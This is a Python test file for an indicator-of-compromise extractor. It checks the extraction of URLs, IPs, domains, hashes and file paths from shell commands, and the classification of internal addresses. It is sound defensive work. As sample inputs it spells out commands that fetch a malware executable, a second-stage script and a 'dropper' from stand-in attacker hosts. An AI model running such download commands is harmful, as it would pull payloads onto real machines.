"""Tests for deterministic IOC extractor."""
import pytest
from ai.ioc_extractor import IOCExtractor, clean_url
from backend.app.schemas.ioc import IOCType
from backend.app.schemas.session import Command


def test_extract_ipv4_and_url():
    extractor = IOCExtractor()
    cmd = Command(
        command="curl http://198.51.100.22/malware.exe -o /tmp/malware.exe",
        timestamp="2026-09-06T00:00:00Z",
        session_id="s1",
    )
    iocs = extractor.extract_from_commands([cmd])
    types = {i.type for i in iocs}
    values = {i.value for i in iocs}

    assert IOCType.URL in types
    assert IOCType.IPV4 in types
    assert IOCType.FILE_PATH in types

    assert "http://198.51.100.22/malware.exe" in values
    assert "198.51.100.22" in values
    assert "/tmp/malware.exe" in values


def test_extract_domain():
    extractor = IOCExtractor()
    cmd = Command(
        command="wget http://c2-botnet.xyz/stage2.sh",
        timestamp="2026-09-06T00:00:00Z",
        session_id="s1",
    )
    iocs = extractor.extract_from_commands([cmd])
    values = {i.value for i in iocs}

    assert "c2-botnet.xyz" in values


def test_extract_hashes():
    extractor = IOCExtractor()
    sha256 = "c26b5278c2e646f90119e71239c09c12204c389bf443c5ee91807cf7c9bb859a"
    md5 = "e99a18c428cb38d5f260853678922e03"
    text = f"echo {sha256} > hash.txt && check {md5}"

    iocs = extractor.extract_from_text(text, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    values = {i.value for i in iocs}

    assert sha256 in values
    assert md5 in values


def test_avoid_false_positives():
    extractor = IOCExtractor()
    text = "echo 127.0.0.1 localhost 2>&1 > /dev/null --port 8080"
    iocs = extractor.extract_from_text(text, session_id="s1", timestamp="2026-09-06T00:00:00Z")

    # 127.0.0.1 should either be flagged internal or excluded, but localhost and /dev/null should not be added as valid C2
    values = {i.value for i in iocs}
    assert "localhost" not in values
    assert "/dev/null" not in values
    for i in iocs:
        if i.value == "127.0.0.1":
            assert i.is_internal is True


def test_markdown_url_extraction():
    extractor = IOCExtractor()

    # 1. Direct clean_url unwrap testing
    assert clean_url("[http://evil-c2.attacker.org/bin/x86](http://evil-c2.attacker.org/bin/x86)") == "http://evil-c2.attacker.org/bin/x86"
    assert clean_url("[http://198.51.100.55/payloads/dropper.sh](http://198.51.100.55/payloads/dropper.sh)") == "http://198.51.100.55/payloads/dropper.sh"
    assert clean_url("[http://example.com/file](http://example.com/file)") == "http://example.com/file"
    assert clean_url("http://evil-c2.attacker.org/bin/x86") == "http://evil-c2.attacker.org/bin/x86"
    assert clean_url("https://example.com/path?a=1") == "https://example.com/path?a=1"
    assert clean_url("(http://example.com/file)") == "http://example.com/file"
    assert clean_url("[http://example.com/file]") == "http://example.com/file"

    # 2. Markdown link with URL as label (http://evil-c2.attacker.org/bin/x86)
    text_c2 = "[http://evil-c2.attacker.org/bin/x86](http://evil-c2.attacker.org/bin/x86)"
    iocs_c2 = extractor.extract_from_text(text_c2, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    urls_c2 = [i.value for i in iocs_c2 if i.type == IOCType.URL]
    domains_c2 = [i.value for i in iocs_c2 if i.type == IOCType.DOMAIN]
    assert urls_c2 == ["http://evil-c2.attacker.org/bin/x86"]
    assert "evil-c2.attacker.org" in domains_c2
    assert not any("[" in u or "]" in u for u in urls_c2)

    # Specific shell command with markdown link
    text_cmd = "curl -O [http://evil-c2.attacker.org/bin/x86](http://evil-c2.attacker.org/bin/x86)"
    iocs_cmd = extractor.extract_from_text(text_cmd, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    urls_cmd = [i.value for i in iocs_cmd if i.type == IOCType.URL]
    assert urls_cmd == ["http://evil-c2.attacker.org/bin/x86"]
    assert not any("[" in u or "]" in u for u in urls_cmd)

    # 3. Markdown link with IP-based URL (http://198.51.100.55/payloads/dropper.sh)
    text_ip = "[http://198.51.100.55/payloads/dropper.sh](http://198.51.100.55/payloads/dropper.sh)"
    iocs_ip = extractor.extract_from_text(text_ip, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    urls_ip = [i.value for i in iocs_ip if i.type == IOCType.URL]
    ips_ip = [i for i in iocs_ip if i.type == IOCType.IPV4]
    assert urls_ip == ["http://198.51.100.55/payloads/dropper.sh"]
    assert any(i.value == "198.51.100.55" and i.is_internal is False for i in ips_ip)
    assert not any("[" in u or "]" in u for u in urls_ip)

    # 4. Markdown link with standard URL (http://example.com/file)
    text_ex = "[http://example.com/file](http://example.com/file)"
    iocs_ex = extractor.extract_from_text(text_ex, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    urls_ex = [i.value for i in iocs_ex if i.type == IOCType.URL]
    assert urls_ex == ["http://example.com/file"]
    assert not any("[" in u or "]" in u for u in urls_ex)

    # 5. Normal raw URLs with query params and paths
    text_raw = "wget http://example.com/file && curl https://example.com/path?a=1"
    iocs_raw = extractor.extract_from_text(text_raw, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    urls_raw = {i.value for i in iocs_raw if i.type == IOCType.URL}
    assert "http://example.com/file" in urls_raw
    assert "https://example.com/path?a=1" in urls_raw
    assert not any("[" in u or "]" in u for u in urls_raw)


def test_rfc5737_and_internal_ip_classification():
    extractor = IOCExtractor()

    # RFC 1918 / Loopback (must be is_internal=True)
    internal_text = "127.0.0.1 10.0.0.50 192.168.1.1"
    iocs_internal = extractor.extract_from_text(internal_text, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    for i in iocs_internal:
        if i.type == IOCType.IPV4:
            assert i.is_internal is True, f"{i.value} should be is_internal=True"

    # RFC 5737 documentation / test IPs (must be is_internal=False)
    external_text = "198.51.100.55 203.0.113.15"
    iocs_external = extractor.extract_from_text(external_text, session_id="s1", timestamp="2026-09-06T00:00:00Z")
    for i in iocs_external:
        if i.type == IOCType.IPV4:
            assert i.is_internal is False, f"{i.value} should be is_internal=False"
